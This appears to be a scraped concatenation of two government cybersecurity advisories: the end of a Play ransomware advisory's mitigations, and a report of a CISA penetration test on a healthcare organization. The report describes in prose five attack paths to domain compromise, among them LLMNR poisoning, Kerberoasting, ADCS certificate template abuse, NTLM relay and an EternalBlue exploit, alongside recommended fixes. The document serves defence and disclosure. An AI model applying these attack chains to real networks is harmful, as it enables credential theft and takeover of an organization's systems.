See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.









MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and ASD’s ACSC recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the security posture for their customers.For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI, CISA, and ASD’s ACSC recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Play ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers,CPG 2.F, 2.R, 2.S, in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST’s standards for developing and managing password policies,CPG 2.C,.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length,CPG 2.B,;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts,CPG 2.G,;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication,CPG 2.H, for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. Also see Protect Yourself: Multi-Factor Authentication | Cyber.gov.au.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,. Organizations are advised to deploy the latest Microsoft Exchange security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken. Also see Patching Applications and Operating Systems | Cyber.gov.au.
Segment networks,CPG 2.F, to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Also see Implementing Network Segmentation and Segregation.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network,CPG 1.E,. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents actors from directly connecting to remote access services they have established for persistence. Also see Inbound Traffic Filtering – Technique D3-ITF.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 1.A, 2.O,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 2.E,.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails,CPG 2.M, received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privileged escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally,CPG 2.E,.
Maintain offline backups of data and regularly maintain backup and restoration,CPG 2.R,. By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-11).
Align your security technologies against this technique.
Test your technologies against this technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Play ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.
REFERENCES,1, Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools,2, TrendMicro: Play Ransomware Spotlight,3, SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a
7,"






Actions to take today to harden your internal environment to mitigate follow-on activity after initial access.




Use phishing-resistant multi-factor authentication (MFA) for all administrative access.
Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials.
Implement network segregation controls.







SUMMARY
In January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a Risk and Vulnerability Assessment (RVA) at the request of a Healthcare and Public Health (HPH) sector organization to identify vulnerabilities and areas for improvement. An RVA is a two-week penetration test of an entire organization, with one week spent on external testing and one week spent assessing the internal network. As part of the RVA, the CISA assessment team conducted web application, phishing, penetration, database, and wireless assessments. The assessed organization was a large organization deploying on-premises software.
During the one-week external assessment, the assessment team did not identify any significant or exploitable conditions in externally available systems that may allow a malicious actor to easily obtain initial access to the organization’s network. Furthermore, the assessment team was unable to gain initial access to the assessed organization through phishing. However, during internal penetration testing, the team exploited misconfigurations, weak passwords, and other issues through multiple attack paths to compromise the organization’s domain.
In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the RVA team’s activities and key findings to provide network defenders and software manufacturers recommendations for improving their organizations’ and customers’ cyber posture, which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector and other critical infrastructure organizations deploying on-premises software, as well as software manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden networks against malicious activity and to reduce the likelihood of domain compromise.
Download the PDF version of this report:


AA23-349A Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment
(PDF,       744.23 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to federal and non-federal entities with respect to cybersecurity risks. See generally 6 U.S.C. §§ 652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating high-level details of the engagement with certain personnel at the organization, CISA conducted the RVA in January 2023.
During RVAs, CISA tests the security posture of an organization’s network over a two-week period to determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the second week (the internal phase), the team determines the susceptibility of the environment to an actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers five services:

Web Application Assessment: The assessment team uses commercial and open source tools to identify vulnerabilities in public-facing and internal web applications, demonstrating how they could be exploited.
Phishing Assessment: The assessment team tests the susceptibility of staff and infrastructure to phishing attacks and determines what impact a phished user workstation could have on the internal network. The RVA team crafts compelling email pretexts and generates payloads, similar to ones used by threat actors, in order to provide a realistic threat perspective to the organization.
Penetration Testing: The assessment team tests the security of an environment by simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish a foothold, escalate privileges, and compromise the domain. The RVA team leverages both open source and commercial tools for host discovery, port and service mapping, vulnerability discovery and analysis, and vulnerability exploitation.
Database Assessment: The assessment team uses commercial database tools to review databases for misconfigurations and missing patches.
Wireless Assessment: The assessment team uses specialized wireless hardware to assess wireless access points, connected endpoints, and user awareness for vulnerabilities.

The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA.

Table 1: In-Scope RVA Services


Phase
Scope
Services




External Assessment
Publicly available HPH-organization endpoints discovered during scanning

Penetration Testing
Phishing Assessment
Web Application Assessment



Internal Assessment
Internally available HPH-organization endpoints discovered during scanning

Database Assessment
Penetration Testing
Web Application Assessment
Wireless Assessment




Phase I: External Assessment
Penetration and Web Application Testing
The CISA team did not identify any significant or exploitable conditions from penetration or web application testing that may allow a malicious actor to easily obtain initial access to the organization’s network.
Phishing Assessment
The CISA team conducted phishing assessments that included both user and systems testing.
The team’s phishing assessment was unsuccessful because the organization’s defensive tools blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s payloads being blocked by host-based protections through a combination of browser, policy, and antivirus software. Some of the payloads were successfully downloaded to disk without being immediately removed, but upon execution, the antivirus software detected the malicious code and blocked it from running. Some payloads appeared to successfully evade host-based protections but did not create a connection to the command and control (C2) infrastructure, indicating they may have been incompatible with the system or blocked by border protections.
Since none of the payloads successfully connected to the assessment team’s C2 server, the team conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link within a phishing email under the pretext of verifying tax information and were then taken to a fake login form.
While twelve unique users from the organization submitted credentials through the malicious form, the CISA team was unable to leverage the credentials because they had limited access to external-facing resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud accounts. Note: At the time of the assessment, the CISA team’s operating procedures did not include certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. However, it is important to note that tools like Evilginx[1] can be leveraged to bypass non-phishing resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a malicious actor’s command and control server, MFA will not prevent the actor from executing commands and carrying out actions under the context of that user.
Phase II: Internal Assessment
Database, Web Application, and Wireless Testing
The CISA assessment team did not identify any significant or exploitable conditions from database or wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, and availability of the tested environment.
The team did identify default credentials [T1078.001] for multiple web interfaces during web application testing and used default printer credentials while penetration testing. (See the Attack Path 2 section for more information.)
Penetration Testing
The assessment team starts internal penetration testing with a connection to the organization’s network but without a valid domain account. The team’s goal is to compromise the domain by gaining domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain domain user access and then escalate privileges until the domain is compromised. This process is called the “attack path”—acquiring initial access to an organization and escalating privileges until the domain is compromised and/or vital assets for the organization are accessed. The attack path requires specialized expertise and is realistic to what adversaries may do in an environment.
For this assessment, the team compromised the organization’s domain through four unique attack paths, and in a fifth attack path the team obtained access to sensitive information.
See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&CK for Enterprise framework. See the Findings section for information on issues that enabled the team to compromise the domain.
Attack Path 1
The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning [T1557.001] with Responder[2], which works in two steps:

Responder listens to multicast name resolution queries (e.g., LLMNR UDP/5355, NBTNS UDP/137) [T1040] and under the right conditions spoofs a response to direct the victim host to a CISA-controlled machine on which Responder is running.
Once a victim connects to the machine, Responder exploits the connection to perform malicious functions such as stealing credentials or opening a session on a targeted host [T1021].

With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. Note: NTLMv2 and other variations of the hash protocol are used for clients to join a domain, authenticate between Active Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and authenticate computers that are not normally a part of the domain.[3] Cracking these passwords may enable malicious actors to establish a foothold in the domain and move laterally or elevate their privileges if the hash belongs to a privileged account.
The service account had a weak password, allowing the team to quickly crack it [T1110.002] and obtain access to the organization’s domain. With domain access, the CISA assessment team enumerated accounts with a Service Principal Name (SPN) set [T1087.002]. SPN is the unique service identifier used by Kerberos authentication[4], and accounts with SPN are susceptible to Kerberoasting.
The CISA team used Impacket’s[5] GetUserSPNs tool to request Ticket-Granting Service (TGS) tickets for all accounts with SPN set and obtained their Kerberos hashes [T1558.003]. Three of these accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a weak password).
Using CrackMapExec[6], the assessment team used ACCOUNT 1 [T1078.002] to successfully connect to a domain controller (DC). The team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share [T1021.002] (see Figure 1).

 

Figure 1: ACCOUNT 1 Domain Admin Privileges

To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it to modify, power off [T1529], and/or delete critical virtual machines, including domain controllers and file servers.
Attack Path 2
The team first mapped the network to identify open web ports [T1595.001], and then attempted to access various web interfaces [T1133] with default administrator credentials. The CISA team was able to log into a printer interface with a default password and found the device was configured with domain credentials to allow employees to save scanned documents to a network share [T1080].
While logged into the printer interface as an administrator, the team 1) modified the “Save as file” configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) changed the Server Name and Network Path to point to a CISA-controlled machine running Responder [T1557]. Then, the team executed a “Connection Test” that sent the username and password over FTP [T1187] to the CISA machine running Responder, which captured cleartext credentials for a non-privileged domain account (ACCOUNT 2).
Using ACCOUNT 2 and Certipy[7], the team enumerated potential certificate template vulnerabilities found in Active Directory Certificate Services (ADCS). Note: ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network. Malicious actors can exploit template misconfigurations [T1649] to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to a domain administrator.
The WebServer template was misconfigured to allow all authenticated users permission to:

Change the properties of the template (via Object Control Permissions with Write Property Principals set to Authenticated Users).
Enroll for the certificate (via Enrollment Permissions including the Authenticated Users group).
Request a certificate for a different user (via EnrolleeSuppliesSubject set as True).

See Figure 2 for the displayed certificate template misconfigurations.

 


The template’s Client Authentication was set to False, preventing the CISA assessment team from requesting a certificate that could be used to authenticate to a server in the domain. To demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, leveraging its status as a mere authenticated user, briefly changed the WebServer template properties to set Client Authentication to True so that a certificate could be obtained for server authentication, ensuring the property was set back to its original setting of False immediately thereafter.
The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as ACCOUNT 3 with the generated certificate [T1550] and retrieved the NTLM hash for ACCOUNT 3 [T1003]. The team used the hash to authenticate to the domain controller [T1550.002] and validated Domain Administrator privileges, demonstrating compromise of the domain via the WebServer template misconfiguration.
Attack Path 3
The CISA team used a tool called CrackMapExec to spray easily guessable passwords [T1110.003] across all domain accounts and obtained two sets of valid credentials for standard domain user accounts.
The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay attack).

 

Figure 3: Misconfigured ADCS Enumerated via Certipy

The team used PetitPotam [8] with ACCOUNT 4 credentials to force the organization’s domain controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced authentication attempt to the ADCS web enrollment service to receive a valid certificate for ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT [T1558] for ACCOUNT 5.
With the TGT for ACCOUNT 5, the CISA team used DCSync to dump the NTLM hash [T1003.006] for ACCOUNT 3 (a Domain Administrator account [see Attack Path 2 section]), effectively leading to domain compromise.
Attack Path 4
The CISA team identified several systems on the organization’s network that do not enforce SMB signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain administrator accounts.
First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. Next, they used Impacket’s NTLMrelayx tool[9] to relay the authentication for the domain administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team then used DonPAPI[10] to dump cleartext credentials through the SOCKS connection and obtained credentials for two additional domain administrator accounts.
The CISA team validated the privileges of these accounts by checking for READ,WRITE access on a domain controller C$ share [T1039], demonstrating Domain Administrator access and therefore domain compromise.
Attack Path 5
The team did vulnerability scanning [T1046] and identified a server vulnerable to CVE-2017-0144 (an Improper Input Validation [CWE-20] vulnerability known as “EternalBlue” that affects SMB version 1 [SMBv1] and enables remote code execution [see Figure 4]).

 

Figure 4: Checking for EternalBlue Vulnerability

The CISA assessment team then executed a well-known EternalBlue exploit [T1210] and established a shell on the server. This shell allowed them to execute commands [T1059.003] under the context of the local SYSTEM account.
With this local SYSTEM account, CISA dumped password hashes from a Security Account Manager (SAM) database [T1003.002]. The team parsed the hashes and identified one for a local administrator account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM hash for the local administrator account, which can be used to authenticate to various services.
The team sprayed the acquired NTLM hash across a network segment and identified multiple instances of password reuse allowing the team to access various resources including sensitive information with the hash.
Findings
Key Issues
The CISA assessments team identified several findings as potentially exploitable vulnerabilities that could compromise the confidentiality, integrity, and availability of the tested environment. Each finding, listed below, includes a description with supporting details. See the Mitigations section for recommendations on how to mitigate these issues.
The CISA team rated their findings on a severity scale from critical to informational (see Table 2).

Table 2: Severity Rating Criteria


Severity
Description




Critical
Critical vulnerabilities pose an immediate and severe risk to the environment because of the ease of exploitation and potential impact. Critical items are reported to the customer immediately.


High
Malicious actors may be able to exercise full control on the targeted device.


Medium
Malicious actors may be able to exercise some control of the targeted device.


Low
The vulnerabilities discovered are reported as items of interest but are not normally exploitable. Many low items reported by security tools are not included in this report because they are often informational, unverified, or of minor risk.


Informational
These vulnerabilities are potential weaknesses within the system that cannot be readily exploited. These findings represent areas that the customer should be cognizant of, but do not require any immediate action.



The CISA assessment team identified four High severity vulnerabilities and one Medium severity vulnerability during penetration testing that contributed to the team’s ability to compromise the domain. See Table 3 for a list and description of these findings.

Table 3: Key Issues Contributing to Domain Compromise


Issue
Severity
Service
Description




Poor Credential Hygiene: Easily Crackable Passwords
High
Penetration Testing

As part of their assessment, the team reviewed the organization’s domain password policy and found it was weak because the minimum password length was set to 8 characters. Passwords less than 15 characters without randomness are easily crackable, and malicious actors with minimal technical knowledge can use these credentials to access the related services.
The assessment team was able to easily crack many passwords throughout the assessment to move laterally and increase access within the domain. Specifically, the team:

Cracked the NTLMv2 hash for a domain account, and subsequently accessed the domain. (See the Attack Path 1 section.)

Cracked the password hash (obtained via Kerberoasting) of a domain administrator account and subsequently compromised the domain. (See the Attack Path 1 section.)



Poor Credential Hygiene: Guessable Credentials
High
Penetration Testing

As part of the penetration test, the assessment team tested to see if one or more services is accessible using a list of enumerated usernames alongside an easily guessed password. The objective is to see if a malicious actor with minimal technical knowledge can use these credentials to access the related services, enabling them to move laterally or escalate privileges. Easily guessable passwords are often comprised of common words, seasons, months and/or years, and are sometimes combined with special characters. Additionally, phrases or names that are popular locally (such as the organization being tested or a local sports teams) may also be considered easily guessable.
The team sprayed common passwords against domain user accounts and obtained valid credentials for standard domain users. (See the Attack Path 3 section.) (Cracking was not necessary for this attack.)



Misconfigured ADCS Certificate Templates
High
Penetration Testing
The team identified a WebServer template configured to allow all authenticated users permission to change the properties of the template and obtain certificates for different users. The team exploited the template to acquire a certificate for a Domain Administrator account (see the Attack Path 2 section).


Unnecessary Network Services Enabled
High
Penetration Testing

Malicious actors can exploit security vulnerabilities and misconfigurations in network services, especially legacy services.
The assessment team identified legacy name resolution protocols (e.g., NetBIOS, LLMNR, mDNS) enabled in the network, and abused LLMNR to capture NTLMv2 hashes, which they then cracked and used for domain access. (See the Attack Path 1 section.)
The team also identified an ADCS server with web enrollment enabled and leveraged it to compromise the domain through coercion and relaying. (See Attack Path 3 section.)
Additionally, the team identified hosts with WebClient and Spooler services, which are often abused by malicious actors to coerce authentication.



Elevated Service Account Privileges
High
Penetration Testing

Applications often require user accounts to operate. These user accounts, which are known as service accounts, often require elevated privileges. If an application or service running with a service account is compromised, an actor may have the same privileges and access as the service account.
The CISA team identified a service account with Domain Administrator privileges and used it to access the domain after cracking its password (See the Attack Path 1 section).



SMB Signing Not Enabled
High
Penetration Testing
The CISA team identified several systems on the organization’s network that do not enforce SMB signing and exploited this for relayed authentication to obtain cleartext credentials for two domain administrator accounts.


Insecure Default Configuration: Default Credentials
Medium
Web Application Assessment

Many off-the-shelf applications are released with built-in administrative accounts using predefined credentials that can often be found with a simple web search. Malicious actors with minimal technical knowledge can use these credentials to access the related services.
During testing, the CISA team identified multiple web interfaces with default administrator credentials and used default credentials for a printer interface to capture domain credentials of a non-privileged domain account. (See the Attack Path 2 section.)




In addition to the issues listed above, the team identified three High and seven Medium severity findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and description of these findings.

Table 4: Additional Key Issues


Issue
Severity
Service
Description




Poor Credential Hygiene: Password Reuse for Administrator and User Accounts
High
Penetration Testing

Elevated password reuse is when an administrator uses the same password for their user and administrator accounts. If the user account password is compromised, it can be used to gain access to the administrative account.
The assessment team identified an instance where the same password was set for an admin user’s administrative account as well as their standard user account.



Poor Credential Hygiene: Password Reuse for Administrator Accounts
Medium
Penetration Testing

If administrator passwords are the same for various administrator accounts, malicious actors can use the password to access all systems that share this credential after compromising one account.
The assessment team found multiple instances of local administrator accounts across various systems using the same password.



Poor Patch Management: Out-of-Date Software
High
Penetration Testing

Patches and updates are released to address existing and emerging security vulnerabilities, and failure to apply the latest leaves systems open to attack with publicly available exploits. (The risk presented by missing patches and updates depends on the severity of the vulnerability).
The assessment team identified several unpatched systems including instances of CVE-2019-0708 (known as “BlueKeep”) and EternalBlue.
The team was unable to successfully compromise the systems with BlueKeep, but they did exploit EternalBlue on a server to implant a shell on a server with local SYSTEM privileges (see the Attack Path 5 section).



Poor Patch Management: Unsupported OS or Application
High
Penetration Testing

Using software or hardware that is no longer supported by the vendor poses a significant security risk because new and existing vulnerabilities are no longer patched). There is no way to address security vulnerabilities on these devices to ensure that they are secure. The overall security posture of the entire network is at risk because an attacker can target these devices to establish an initial foothold into the network.
The assessment team identified end-of-life (EOL) Windows Server 2008 R2 and Windows Server 2008 and Windows 5.1.



Use of Weak Authentication Measures
Medium
Penetration Testing

Applications may have weak or broken mechanisms to verify user identity before granting user access to protected functionalities. Malicious actors can exploit these to bypass authentication and gain access to use application resources and functionality.
The assessment team abused the Cisco Smart Install protocol to obtain configuration files for several Cisco devices on the organization’s network. These files contained encrypted Cisco passwords. (The CISA team was unable to crack these passwords within the assessment timeframe.)



PII Disclosure
Medium
Penetration Testing
The assessment team identified an unencrypted Excel file containing PII on a file share.


Hosts with Unconstrained Delegation Enabled Unnecessarily
Medium
Penetration Testing

The CISA team identified two systems that appeared to be configured with Unconstrained Delegation enabled. Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or silver ticket attacks.
Although the assessment team was unable to fully exploit this configuration because they lost access to one of the vulnerable hosts, it could have led to domain compromise under the right circumstances.



Cleartext Password Disclosure
Medium
Penetration Testing

Storing passwords in cleartext is a security risk because malicious actors with access to these files can use them.
The assessment team identified several unencrypted files on a file share containing passwords for various personal and organizational accounts.



Insecure File Shares
Medium
Penetration Testing

Access to sensitive data (e.g., data related to business functions, IT functions, and/or personnel) should be restricted to only certain authenticated and authorized users.
The assessment team found an unsecured directory on a file share with sensitive IT information. The directory was accessible to all users in the domain group. Malicious actors with user privileges could access and/or exfiltrate this data.




Additional Issues
The CISA team identified one Informational severity within the organization’s networks and systems. These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment, but are not readily exploitable. The information provided is to encourage the stakeholder to investigate these issues further to adjust their environments or eliminate certain aspects as needed, but the urgency is low.

Table 5: Informational Issues That CISA Team Noted


Issue
Severity
Service
Description




Overly Permissive Accounts
  Informational
 Penetration Testing

Account privileges are intended to control user access to host or application resources to limit access to sensitive information in support of a least-privilege security model. When user (or other) accounts have high privileges, users can see and/or do things they normally should not, and malicious actors can exploit this to access host and application resources.
The assessment team identified Active Directory objects where the Human Resources group appeared to be part of the privileged Account Operators group. This may have provided elevated privileges to accounts in the Human Resources group. (The CISA team was unable to validate and demonstrate the potential impact of this relationship within the assessment period).




Noted Strengths
The CISA team noted the following business, technical, and administrative components that enhanced the network security posture of the tested environment:

The organization’s network was found to have several strong, security-oriented characteristics such as:

Effective antivirus software;
Endpoint detection and response capabilities;
Good policies and best practices for protecting users from malicious files including not allowing users to mount ISO files;
Minimal external attack surface, limiting an adversary’s ability to leverage external vulnerabilities to gain initial access to the organization’s networks and systems;
Strong wireless protocols;
And network segmentation.


The organization’s security also demonstrated their ability to detect some of the CISA team's actions throughout testing and overall situational awareness through the use of logs and alerts.
The organization used MFA for cloud accounts. The assessment team obtained cloud credentials via a phishing campaign but was unable to use them because of MFA prompts.

MITIGATIONS
Network Defenders
CISA recommends HPH Sector and other critical infrastructure organizations implement the mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Table 6: Recommendations to Mitigate Identified Issues


Issue
Recommendation




Poor Credential Hygiene: Easily Crackable Passwords


Follow National Institute of Standards and Technologies (NIST) guidelines when creating password policies to enforce use of “strong” passwords that cannot be cracked [CPG 2.B].[11] Consider using password managers to generate and store passwords.
Use “strong” passphrases for private keys to make cracking resource intensive [CPG 2.B]. Do not store credentials within the registry in Windows systems. Establish an organizational policy that prohibits password storage in files.
Ensure adequate password length (ideally 15+ characters) and complexity requirements for Windows service accounts and implement passwords with periodic expiration on these accounts [CPG 2.B]. Use Managed Service Accounts, when possible, to manage service account passwords automatically.




Poor Credential Hygiene: Guessable Credentials


Do not reuse local administrator account passwords across systems. Ensure that passwords are “strong” and unique [CPG 2.C].
Use phishing-resistant multi-factor authentication (MFA) for all administrative access, including domain administrative access [CPG 2.H]. If an organization that uses mobile push-notification-based MFA is unable to implement phishing-resistant MFA, use number matching to mitigate MFA fatigue. For more information, see CISA fact sheets on Implementing Phishing-Resistant MFA and Implementing Number Matching in MFA Applications.




Misconfigured ADCS Certificate Templates


Restrict enrollment rights in templates to only those users or groups that require it. Remove the Enrollee Supplies Subject flag from templates if it is not necessary or enforce manager approval if required. Consider removing Write Owner, Write DACL and Write Property permissions from low-privilege groups, such as Authenticated Users where those permissions are not needed.




Unnecessary Network Services Enabled


Ensure that only ports, protocols, and services with validated business needs are running on each system. Disable deprecated protocols (including NetBIOS, LLMNR, and mDNS) on the network that are not strictly necessary for business functions, or limit the systems and services that use the protocol, where possible [CPG 2.W].
Disable the WebClient and Spooler services where possible to minimize risk of coerced authentication.
Disable ADCS web-enrollment services. If this service cannot be disabled, disable NTLM authentication to prevent malicious actors from performing NTLM relay attacks or abusing the Spooler and WebClient services to coerce and relay authentication to the web-enrollment service.




Elevated Service Account Privileges


Run daemon applications using a non-Administrator account when appropriate.
Configure Service accounts with only the permissions necessary for the services they operate.
To mitigate Kerberoasting attacks, use AES or stronger encryption instead of RC4 for Kerberos hashes [CPG 2.K]. RC4 is considered weak encryption.




SMB Signing Not Enabled


Require SMB signing for both SMB client and server on all systems to prevent certain adversary-in-the-middle and pass-the-hash attacks. See Microsoft’s Overview of Server Message Block signing for more information.




Insecure Default Configuration: Default Credentials


Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials [CPG 2.A].
Before deploying any new devices in a networked environment, change all default passwords for applications, operating systems, routers, firewalls, wireless access points, and other systems to have values consistent with administration-level accounts [CPG 2.A].




Poor Credential Hygiene: Password Reuse for Administrator and User Accounts


Discontinue reuse or sharing of administrative credentials among user/administrative accounts [CPG 2.C].
Use unique credentials across workstations, when possible, in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.
Train users, especially privileged users, against password reuse [CPG 2.I].




